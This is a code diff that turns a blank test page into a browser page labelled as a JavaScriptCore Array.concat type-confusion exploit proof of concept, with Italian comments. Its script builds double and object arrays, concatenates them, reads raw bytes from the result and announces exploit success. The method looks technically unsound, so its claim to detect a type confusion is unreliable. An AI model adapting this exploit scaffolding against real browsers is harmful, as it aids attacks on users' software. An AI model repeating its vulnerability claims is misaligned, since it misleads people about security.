@@ -1,39 +1,91 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  
+    <title>JSC Array Concat PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        .box {
+            background: #f0f0f0;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        button {
+            padding: 10px 20px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        #output {
+            margin-top: 20px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+    </style>
 </head>
 <body>
-  <h1>TEST</h1>
+    <h1>JavaScriptCore Array.concat Type Confusion PoC</h1>
+    
+    <div class="box">
+        <p>Questo exploit dimostra una type confusion tramite la concatenazione di array di tipi diversi.</p>
+        <button onclick="runExploit()">Esegui Exploit</button>
+        <div id="output"></div>
+    </div>
 
-  <script>
-// 1. Crea un array ottimizzato per valori double (ArrayWithDouble)
-let doubleArray = [1.1];
-for (let i = 0; i < 100000; i++) {
-    doubleArray.push(2.2); // Forza la rappresentazione ArrayWithDouble
-}
-doubleArray.length = 1; // Compatta l'array
+    <script>
+        function log(message) {
+            document.getElementById('output').textContent += message + '\n';
+        }
 
-// 2. Crea un array di oggetti (ArrayWithContiguous)
-let objectArray = [{}];
-
-// 3. Concatena i due array sfruttando la vulnerabilità
-let corruptedArray = doubleArray.concat(objectArray);
-
-// 4. Accedi agli elementi "corrotti"
-let corruptedValue = corruptedArray[0];
-
-// 5. Converti il valore in bytes per leggere la rappresentazione raw
-let buffer = new ArrayBuffer(8);
-let floatView = new Float64Array(buffer);
-let intView = new BigUint64Array(buffer);
-floatView[0] = corruptedValue;
-let leakedBytes = intView[0];
-
-// Output: Se non NaN-boxed, mostra bytes crudi invece di 0x3ff199999999999a (1.1)
-alert("Bytes leakkati: 0x" + leakedBytes.toString(16));
-      
-  </script>
+        function runExploit() {
+            log('[+] Inizializzazione array...');
+            
+            try {
+                // 1. Crea array ottimizzato per double
+                let doubleArray = [1.1];
+                for(let i = 0; i < 100000; i++) {
+                    doubleArray.push(2.2);
+                }
+                doubleArray.length = 1;
+                
+                // 2. Crea array di oggetti
+                let objectArray = [{}];
+                
+                log('[+] Concatenazione array...');
+                let corruptedArray = doubleArray.concat(objectArray);
+                
+                // 3. Legge il valore corrotti
+                let corruptedValue = corruptedArray[0];
+                
+                // 4. Conversione in raw bytes
+                let buffer = new ArrayBuffer(8);
+                new Float64Array(buffer)[0] = corruptedValue;
+                let bytes = new BigUint64Array(buffer)[0];
+                let hexBytes = '0x' + bytes.toString(16).padStart(16, '0');
+                
+                log('[+] Valore letto: ' + corruptedValue);
+                log('[+] Bytes leakati: ' + hexBytes);
+                
+                // 5. Verifica vulnerabilità
+                let expectedNormal = 0x3ff199999999999an; // Rappresentazione corretta di 1.1
+                if(bytes !== expectedNormal) {
+                    alert('[!] EXPLOIT SUCCESSO: Valore non NaN-boxed rilevato!');
+                    alert('    Questo indica una type confusion nei dati');
+                } else {
+                   alert('[+] Sistema non vulnerabile');
+                }
+                
+            } catch(e) {
+                alert('[ERR] Errore durante l\'esecuzione: ' + e);
+            }
+        }
+    </script>
 </body>
 </html>
